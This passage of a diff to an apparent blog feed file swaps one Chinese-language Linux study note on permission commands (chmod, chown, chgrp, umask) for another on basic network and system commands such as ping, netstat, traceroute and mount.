+        <content type="html"><![CDATA[<h1 id="权限命令chmod"><a href="#权限命令chmod" class="headerlink" title="权限命令chmod"></a>权限命令chmod</h1><p>命令名称：chmod<br>英文：change the permissions mode of a file<br>命令所在路径：/bin/chmod<br>执行权限:所有用户<br>语法：chmod [{ugoa} {+-=} {rwx}][文件或目录]<br>            [mode=421][文件或目录]<br>            -R 递归修改 当操作目录时会将目录下的所有文件都改为一个修改值<br>功能描述：改变文件或目录权限<br>所有者u 所属组g 其他人o 所有人a<br>+增加权限 -减少权限 =修改权限<br>权限数字表示<br>r — 4<br>w — 2<br>x — 1<br>rwxrw-r– 764<br><img src="/.io//photo/linuxp/1.png" alt="Alt text" title="chmod权限修改"></p><p>当在777文件夹下存在一个644文件夹普通用户可以删除644文件夹  </p><p>文件<br>    r：cat/more/head/tail/less  查看内容<br>    w:vim 修改文件内容<br>    x:script command 可执行文件  </p><p>文件目录权限<br>| r                    | w                        | x            |<br>| ——————– | ———————— | ———— |<br>| 读权限               | 写权限                   | 执行权限     |<br>| 看文件内容           | 修改文件内容             | 执行文件内容 |<br>| 列出文件目录中的内容 | 创建删除文件或里面的目录 | 可以进入目录 |<br>| ls                   | touch/mkdir/rmidr/rm     | cd           |</p><p>更改权限：root和所属者  </p><h1 id="其他权限管理命令"><a href="#其他权限管理命令" class="headerlink" title="其他权限管理命令"></a>其他权限管理命令</h1><h2 id="权限管理命令：chown"><a href="#权限管理命令：chown" class="headerlink" title="权限管理命令：chown"></a>权限管理命令：chown</h2><p>命令英文原意: change file ownership<br>命令所在路径:/bin/chown<br>执行权限:所有用户<br>语法: chown[用户][文件或目录]<br>功能描述:改变文件或目录的所有者<br>useradd 添加用户  </p><h2 id="命令名称-chgrp"><a href="#命令名称-chgrp" class="headerlink" title="命令名称: chgrp"></a>命令名称: chgrp</h2><p>命令英文原意: change file group ownership<br>命令所在路径:/bin/chgrp<br>执行权限:所有用户<br>语法: chgrp[用户组][文件或目录]<br>功能描述:改变文件或目录的所属组<br>groupadd 添加组<br>缺省组就是默认组的意思  </p><h2 id="命令名称-umask"><a href="#命令名称-umask" class="headerlink" title="命令名称: umask"></a>命令名称: umask</h2><p>命令英文原意:the user file-creation mask<br>命令所在路径:Shell内置命令<br>执行权限:所有用户<br>语法: umask[-S]<br>-S以rwx形式显示新建文件缺省权限<br>功能描述:显示、设置文件的缺省权限<br>新创建的文件（touch）是没有可执行权限的（x）</p><p>umask 022<br>即为默认755<br>当mask的值是022—-w–w-<br>他的本来的权限与777是逻辑与的关系755目录，文件没有可执行权限即644</p>]]></content>
       
       
       
@@ -984,11 +984,11 @@
     
     
     <entry>
-      <title>权限管理命令</title>
-      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
-      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
+      <title>网络命令</title>
+      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/"/>
+      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/</url>
       
-        <content type="html"><![CDATA[<h1 id="权限命令chmod"><a href="#权限命令chmod" class="headerlink" title="权限命令chmod"></a>权限命令chmod</h1><p>命令名称：chmod<br>英文：change the permissions mode of a file<br>命令所在路径：/bin/chmod<br>执行权限:所有用户<br>语法：chmod [{ugoa} {+-=} {rwx}][文件或目录]<br>            [mode=421][文件或目录]<br>            -R 递归修改 当操作目录时会将目录下的所有文件都改为一个修改值<br>功能描述：改变文件或目录权限<br>所有者u 所属组g 其他人o 所有人a<br>+增加权限 -减少权限 =修改权限<br>权限数字表示<br>r — 4<br>w — 2<br>x — 1<br>rwxrw-r– 764<br><img src="/.io//photo/linuxp/1.png" alt="Alt text" title="chmod权限修改"></p><p>当在777文件夹下存在一个644文件夹普通用户可以删除644文件夹  </p><p>文件<br>    r：cat/more/head/tail/less  查看内容<br>    w:vim 修改文件内容<br>    x:script command 可执行文件  </p><p>文件目录权限<br>| r                    | w                        | x            |<br>| ——————– | ———————— | ———— |<br>| 读权限               | 写权限                   | 执行权限     |<br>| 看文件内容           | 修改文件内容             | 执行文件内容 |<br>| 列出文件目录中的内容 | 创建删除文件或里面的目录 | 可以进入目录 |<br>| ls                   | touch/mkdir/rmidr/rm     | cd           |</p><p>更改权限：root和所属者  </p><h1 id="其他权限管理命令"><a href="#其他权限管理命令" class="headerlink" title="其他权限管理命令"></a>其他权限管理命令</h1><h2 id="权限管理命令：chown"><a href="#权限管理命令：chown" class="headerlink" title="权限管理命令：chown"></a>权限管理命令：chown</h2><p>命令英文原意: change file ownership<br>命令所在路径:/bin/chown<br>执行权限:所有用户<br>语法: chown[用户][文件或目录]<br>功能描述:改变文件或目录的所有者<br>useradd 添加用户  </p><h2 id="命令名称-chgrp"><a href="#命令名称-chgrp" class="headerlink" title="命令名称: chgrp"></a>命令名称: chgrp</h2><p>命令英文原意: change file group ownership<br>命令所在路径:/bin/chgrp<br>执行权限:所有用户<br>语法: chgrp[用户组][文件或目录]<br>功能描述:改变文件或目录的所属组<br>groupadd 添加组<br>缺省组就是默认组的意思  </p><h2 id="命令名称-umask"><a href="#命令名称-umask" class="headerlink" title="命令名称: umask"></a>命令名称: umask</h2><p>命令英文原意:the user file-creation mask<br>命令所在路径:Shell内置命令<br>执行权限:所有用户<br>语法: umask[-S]<br>-S以rwx形式显示新建文件缺省权限<br>功能描述:显示、设置文件的缺省权限<br>新创建的文件（touch）是没有可执行权限的（x）</p><p>umask 022<br>即为默认755<br>当mask的值是022—-w–w-<br>他的本来的权限与777是逻辑与的关系755目录，文件没有可执行权限即644</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h1><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>指令所在路径: /usr/bin/write<br>执行权限:所有用户<br>语法: write&lt;用户名&gt;<br>功能描述:给用户发信息，以Ctrl+D保存结束  </p><h2 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h2><p>命令英文原意:write all<br>指令所在路径:/usr/bin/wall<br>执行权限:所有用户<br>语法: wall [message]<br>功能描述:发广播信息  </p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>命令所在路径:/bin/ping<br>执行权限:所有用户<br>语法: ping选项IP地址<br>-c指定发送次数<br>功能描述:测试网络连通性   </p><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>命令英文原意: interface configure<br>命令所在路径:/sbin/ifconfig<br>执行权限: root<br>语法: ifconfig网卡名称IP地址<br>功能描述:查看和设置网卡信息  </p><h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>命令所在路径:/bin/mail<br>执行权限:所有用户语法: mail [用户名]<br>功能描述:查看发送电子邮件  </p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>命令所在路径:/usr/bin/last<br>执行权限:所有用户<br>语法: last<br>功能描述:列出目前与过去登入系统的用户信息  </p><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><p>命令所在路径:/usr/bin/lastlog<br>执行权限:所有用户<br>语法: lastlog<br>功能描述:检查某特定用户上次登录的时间<br>-u 加id只查看该用户   </p><h2 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h2><p>命令所在路径:/bin/traceroute<br>执行权限:所有用户<br>语法: traceroute<br>功能描述:显示数据包到主机间的路径<br>traceroute <a href="http://www.baidu.com/">www.baidu.com</a>  </p><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>命令所在路径:/bin/netstat<br>执行权限:所有用户<br>语法: netstat[选项]<br>功能描述:显示网络相关信息<br>-t tcp协议<br>-u UDP协议<br>-l 监听<br>-r 路由<br>-n 显示ip地址和端口号<br>服务发起端口是随机的，只有接收端口是固定的<br>netstat -tlun<br>查看本机监听的端口<br>netstat -an<br>查看本机所有的网络连接<br>#netstat -rn<br>查看本机路由表  </p><h2 id="setup-redhat"><a href="#setup-redhat" class="headerlink" title="setup (redhat)"></a>setup (redhat)</h2><p>命令所在路径:/usr/bin/setup<br>执行权限:root<br>语法: setup<br>功能描述:配置网络  </p><h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>命令位置:/bin/mount<br>执行权限:所有用户<br>命令语法: mount [-t文件系统]设备文件名挂载点<br>范例:# mount -t iso9660 /dev/sr0 /mnt/cdrom  </p>]]></content>
       
       
       
